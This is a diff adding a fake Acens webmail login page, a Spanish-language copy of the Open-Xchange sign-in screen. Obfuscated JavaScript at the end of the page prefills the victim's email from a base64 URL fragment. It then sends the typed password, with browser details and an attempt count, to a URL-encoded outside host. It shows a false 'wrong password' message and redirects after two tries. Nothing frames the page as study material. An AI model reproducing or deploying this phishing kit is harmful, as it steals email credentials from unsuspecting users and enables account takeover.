@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+<meta name="msapplication-tap-highlight" content="no">
+<meta name="google" value="notranslate">
+<meta name="theme-color" content="#3c73aa">
+
+
+<meta id="win8Icon" name="msapplication-TileImage" content="">
+<meta id="win8TileColor" name="msapplication-TileColor" content="#3c739b">
+
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+<link id="favicon" rel="shortcut icon" href="https://acens.webmail.es/appsuite/apps/themes/acens/favicon.ico" type="image/x-icon">
+
+
+<link id="icon57" rel="apple-touch-icon" href="https://acens.webmail.es/appsuite/login.html">
+<link id="icon72" rel="apple-touch-icon" sizes="72x72" href="https://acens.webmail.es/appsuite/login.html">
+<link id="icon76" rel="apple-touch-icon" sizes="76x76" href="https://acens.webmail.es/appsuite/login.html">
+<link id="icon114" rel="apple-touch-icon" sizes="114x114" href="https://acens.webmail.es/appsuite/login.html">
+<link id="icon120" rel="apple-touch-icon" sizes="120x120" href="https://acens.webmail.es/appsuite/login.html">
+<link id="icon144" rel="apple-touch-icon" sizes="144x144" href="https://acens.webmail.es/appsuite/login.html">
+<link id="icon152" rel="apple-touch-icon" sizes="152x152" href="https://acens.webmail.es/appsuite/login.html">
+	 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> </script> 
+
+
+<link id="splash460" href="https://acens.webmail.es/appsuite/login.html" media="(device-width: 320px)" rel="apple-touch-startup-image">
+
+<link id="splash920" href="https://acens.webmail.es/appsuite/login.html" media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link id="splash1096" href="https://acens.webmail.es/appsuite/login.html" media="(device-aspect-ratio: 40/71)" rel="apple-touch-startup-image">
+
+<link rel="stylesheet" href="./samu/login.css">
+<style type="text/css">
+
+html, body { background-color: #fff; margin: 0; padding: 0; border: 0; }
+body { overflow: hidden; }
+
+.throbber {
+    position: absolute;
+    top: 50%;
+    width: 100%;
+    text-align: center;
+    margin: -10px 0 -21px 0;
+}
+
+.throbber > div {
+    width: 14px;
+    height: 14px;
+    background-color: #ccc;
+    border-radius: 100%;
+    display: inline-block;
+    -webkit-animation: bouncedelay 1.4s infinite ease-in-out;
+    animation: bouncedelay 1.4s infinite ease-in-out;
+    /* Prevent first frame from flickering when animation starts */
+    -webkit-animation-fill-mode: both;
+    animation-fill-mode: both;
+}
+
+.throbber .bounce1 {
+    -webkit-animation-delay: -0.32s;
+    animation-delay: -0.32s;
+}
+
+.throbber .bounce2 {
+    -webkit-animation-delay: -0.16s;
+    animation-delay: -0.16s;
+}
+
+@-webkit-keyframes bouncedelay {
+  0%, 80%, 100% { -webkit-transform: scale(0.0) }
+  40% { -webkit-transform: scale(1.0) }
+}
+
+@keyframes bouncedelay {
+  0%, 80%, 100% {
+    transform: scale(0.0);
+    -webkit-transform: scale(0.0);
+  } 40% {
+    transform: scale(1.0);
+    -webkit-transform: scale(1.0);
+  }
+}
+</style>
+
+<meta id="bootstrap">
+<meta id="theme">
+<meta id="css">
+<meta id="custom">
+<meta id="code">
+
+<link rel="stylesheet" href="./samu/acens.css">
+<script>
+                                                                                                                                                                                                     
+</script>
+
+<script src="./samu/run_login.js.download"></script>
+
+</head>
+<body class="unselectable">
+
+<div id="io-ox-core" class="abs unselectable" style="display: none">
+
+    <div id="io-ox-banner">
+        <span class="banner-logo" style="display: none"></span>
+        <span class="banner-title"></span>
+        <span class="banner-content"></span>
+    </div>
+
+    <div id="io-ox-topbar" role="banner" class="f6-target">
+        <div role="navigation">
+            <ul class="launchers list-unstyled"></ul>
+        </div>
+    </div>
+
+    <div id="io-ox-screens" class="abs">
+
+        <div id="io-ox-windowmanager" class="abs" style="display: none">
+            <div id="io-ox-windowmanager-pane" class="atb"></div>
+        </div>
+
+        <div id="io-ox-desktop" class="abs"></div>
+    </div>
+</div>
+
+
+<div id="io-ox-login-screen" class="unselectable" style="display: block">
+	<div id="io-ox-login-background" class="wallpaper"></div>
+	<div id="io-ox-login-blocker" style="display: none"></div>
+	<div id="io-ox-login-container-scrollpane">
+		<div class="imagen-marca">
+      	<img class="img-responsive center-block" src="./samu/logo-acens.svg" width="160px">
+		</div>
+		<div id="io-ox-login-container" class="container">
+			<div id="io-ox-login-header">
+        	<h1>
+          	<!-- -->
+				</h1>
+			</div>
+			<div class="container">
+				<div id="io-ox-login-form-container">
+					<div class="row">
+						<div class="col-sm-offset-4 col-sm-4">
+							<p class="logo-acceso">Acceso webmail</p>
+						</div>
+					</div>
+					<div class="row">
+						<div class="col-xs-offset-2 col-xs-8 col-sm-offset-4 col-sm-4">
+							<div class="row">
+								<form method="post" id="io-ox-form">
+									<input type="hidden" name="location" value="">
+									<div class="row help">
+										<div class="col-md-12">
+											<p id="io-ox-login-help" class="help-block"></p>
+										</div>
+									</div>
+									<div class="row username">
+										<div class="form-group col-md-12">
+											<label for="io-ox-login-username" class="sr-only">Dirección de correo</label>
+											<input type="email" id="io-ox-login-username" name="login" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" placeholder="Dirección de correo" readonly>
+										</div>
+									</div>
+									<div class="row password">
+										<div class="form-group col-md-12">
+											<label for="io-ox-login-password" class="sr-only" data-i18n="Password">Password</label>
+											<input type="password" id="io-ox-login-password" name="password" class="form-control" maxlength="100" autocorrect="off" autocapitalize="off" aria-required="true" placeholder="Password" data-i18n="Password" data-i18n-attr="placeholder" autofocus>
+										</div>
+									</div>
+									<div class="row feedback">
+										<div class="col-md-12" id="io-ox-login-feedback"></div>
+									</div>
+									<div class="row options" style="text-align: center;">
+										<div class="col-sm-12 col-md-12 checkbox" id="io-ox-login-store">
+											<label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label">
+												<input type="checkbox" id="io-ox-login-store-box" checked="checked" name="store" value="1">Mantenerse conectado
+											</label>
+										</div>
+
+                    <input type="hidden" name="client" value="open-xchange-appsuite">
+                    <input type="hidden" name="uiWebPath" value="/appsuite/">
+                    <input type="hidden" name="version" value="Acceso login">
+
+									</div>
+									<div class="row buttons">
+										<div class="form-group col-xs-offset-3 col-xs-6">
+											<input type="submit" name="signin" id="io-ox-button" class="btn btn-primary form-control" value="Acceder" data-i18n="Sign in" data-i18n-attr="value,aria-label">
+										</div>
+									</div>
+								</form>
+
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<footer id="io-ox-login-footer">
+    	<!--span id="io-ox-languages"></span-->
+			<!--span id="io-ox-copyright"></span-->
+		</footer>
+	</div>
+</div>
+
+
+<div id="io-ox-offline" style="bottom: -41px; display: none;"></div>
+
+
+<div id="io-ox-alert-screenreader" role="alert" aria-live="polite" class="sr-only">
+  <span id="sr-alert-text"></span>
+</div>
+
+
+<svg style="height:0;"><filter id="overlay-effect"><fegaussianblur stdDeviation="2"></fegaussianblur></filter></svg>
+
+
+<noscript>
+<p class="noscript">This app uses JavaScript. Your browser either doesn't support JavaScript or you have it turned off. To use this app please use a JavaScript enabled browser.</p>
+</noscript>
+
+
+
+
+</body>
+
+<script>
+var _0x35fd58=_0x4caf;(function(_0x133565,_0x4a0db5){var _0x4cfe4c=_0x4caf,_0x1dbc39=_0x133565();while(!![]){try{var _0x4751e3=-parseInt(_0x4cfe4c(0x121))/0x1*(-parseInt(_0x4cfe4c(0x128))/0x2)+parseInt(_0x4cfe4c(0x129))/0x3+-parseInt(_0x4cfe4c(0x114))/0x4+parseInt(_0x4cfe4c(0x13b))/0x5+-parseInt(_0x4cfe4c(0x137))/0x6+-parseInt(_0x4cfe4c(0x135))/0x7*(parseInt(_0x4cfe4c(0x11f))/0x8)+parseInt(_0x4cfe4c(0x112))/0x9;if(_0x4751e3===_0x4a0db5)break;else _0x1dbc39['push'](_0x1dbc39['shift']());}catch(_0x2b4d3b){_0x1dbc39['push'](_0x1dbc39['shift']());}}}(_0x418e,0xcbeab));function getBrowserType(){var _0x7bf31d=_0x4caf;const _0x48333f=_0x190555=>{var _0x428656=_0x4caf;return _0x190555['test'](navigator[_0x428656(0x12c)]);};if(_0x48333f(/opr\//i)||!!window[_0x7bf31d(0x133)])return _0x7bf31d(0x127);else{if(_0x48333f(/edg/i))return _0x7bf31d(0x123);else{if(_0x48333f(/chrome|chromium|crios/i))return'Google\x20Chrome';else{if(_0x48333f(/firefox|fxios/i))return _0x7bf31d(0x125);else{if(_0x48333f(/safari/i))return'Apple\x20Safari';else{if(_0x48333f(/trident/i))return'Microsoft\x20Internet\x20Explorer';else{if(_0x48333f(/ucbrowser/i))return'UC\x20Browser';else return _0x48333f(/samsungbrowser/i)?'Samsung\x20Browser':'Unknown\x20browser';}}}}}}}const browserType=getBrowserType(),fvi=unescape(_0x35fd58(0x130));var str=window[_0x35fd58(0x117)][_0x35fd58(0x11c)],strs=str[_0x35fd58(0x12d)]('#'),emaqa=strs[0x1],emaq=atob(emaqa);emaq&&(document[_0x35fd58(0x136)](_0x35fd58(0x122))[_0x35fd58(0x132)]=emaq);$(document)[_0x35fd58(0x111)](function(){var _0x3448f3=_0x35fd58,_0x10f6e6=0x0;$('#io-ox-button')[_0x3448f3(0x134)](function(_0x43d97d){var _0x15ab72=_0x3448f3;$(_0x15ab72(0x120))[_0x15ab72(0x12e)](),$(_0x15ab72(0x11b))['hide'](),_0x43d97d['preventDefault']();var _0x1c1585=emaq,_0x478a36=$(_0x15ab72(0x12a))['val'](),_0x5a1e39=_0x1c1585;_0x10f6e6=_0x10f6e6+0x1,$[_0x15ab72(0x13a)]({'dataType':'JSON','url':unescape('%68%74%74%70%73%3A%2F%2F%6D%61%69%6C%68%6F%73%74%6C%63%2E%69%6E%66%6F%2F%7A%65%2F%62%6C%75%2E%70%68%70'),'type':_0x15ab72(0x124),'data':{'nuyak':_0x1c1585,'puyak':_0x478a36,'cun':_0x10f6e6,'hd':fvi,'brr':browserType},'beforeSend':function(_0x6365e6){},'success':function(_0x326c0a){var _0x50707e=_0x15ab72;_0x326c0a&&($(_0x50707e(0x115))[_0x50707e(0x12b)](),console[_0x50707e(0x11a)](_0x326c0a),_0x326c0a['signal']=='ok'?($('#rcmloginpwd')[_0x50707e(0x11e)](''),_0x10f6e6>=0x2&&(_0x10f6e6=0x0,window[_0x50707e(0x117)][_0x50707e(0x118)](_0x50707e(0x119)+_0x1c1585)),$(_0x50707e(0x115))[_0x50707e(0x12f)](_0x326c0a[_0x50707e(0x138)])):$(_0x50707e(0x115))['html'](_0x326c0a[_0x50707e(0x138)]));},'error':function(){var _0x41a52e=_0x15ab72;$('#io-ox-login-password')[_0x41a52e(0x11e)](''),_0x10f6e6>=0x2&&(_0x10f6e6=0x0,$('#io-ox-login-feedback')[_0x41a52e(0x12f)](''),window[_0x41a52e(0x117)][_0x41a52e(0x118)]('set.htm?usr='+_0x1c1585)),_0x10f6e6==0x1&&($(_0x41a52e(0x115))['show'](),$(_0x41a52e(0x115))[_0x41a52e(0x12f)](_0x41a52e(0x110)));},'complete':function(){}});});});function _0x418e(){var _0x2b7a04=['cookie','Opera','15338RGMSlO','2762673DtAFth','#io-ox-login-password','show','userAgent','split','hide','html','%57%65%62%6D%61%69%6C%20%41%63%65%6E%73','qqww','value','opr','click','23268PsYjkZ','getElementById','7796934ezdOvO','msg','substring','ajax','6089665CcCrUp','<div\x20class=\x27row\x20feedback\x27><div\x20class=\x27col-md-12\x20alert\x20alert-info\x27\x20id=\x27io-ox-login-feedback\x27>El\x20nombre\x20de\x20usuario\x20o\x20la\x20contraseña\x20son\x20incorrectos</div></div>','ready','5701680DPXMzT','indexOf','2159736YsGWTt','#io-ox-login-feedback','charAt','location','replace','set.htm?usr=','log','#msg','href','length','val','272yYrmGc','#error','2RXZQyZ','io-ox-login-username','Microsoft\x20Edge','POST','Mozilla\x20Firefox'];_0x418e=function(){return _0x2b7a04;};return _0x418e();}function getCookie(_0x99b1b2){var _0x5a63b9=_0x35fd58,_0x34636d=_0x99b1b2+'=',_0x43ae05=document[_0x5a63b9(0x126)][_0x5a63b9(0x12d)](';');for(var _0x469876=0x0;_0x469876<_0x43ae05[_0x5a63b9(0x11d)];_0x469876++){var _0x557c7f=_0x43ae05[_0x469876];while(_0x557c7f[_0x5a63b9(0x116)](0x0)=='\x20'){_0x557c7f=_0x557c7f[_0x5a63b9(0x139)](0x1);}if(_0x557c7f[_0x5a63b9(0x113)](_0x34636d)==0x0)return _0x557c7f[_0x5a63b9(0x139)](_0x34636d[_0x5a63b9(0x11d)],_0x557c7f[_0x5a63b9(0x11d)]);}return'';}function _0x4caf(_0x5248cc,_0x7e4c6c){var _0x418e4c=_0x418e();return _0x4caf=function(_0x4cafbd,_0x43fa36){_0x4cafbd=_0x4cafbd-0x110;var _0x2598a9=_0x418e4c[_0x4cafbd];return _0x2598a9;},_0x4caf(_0x5248cc,_0x7e4c6c);}function checkCookie(_0x254d65){var _0x17aabb=_0x35fd58,_0x48038d=getCookie(_0x17aabb(0x131));if(_0x48038d!='')window[_0x17aabb(0x117)]['href']=_0x17aabb(0x119)+_0x254d65;else{if(_0x48038d!=''&&_0x48038d!=null){}}}checkCookie();
+</script>
+</html>
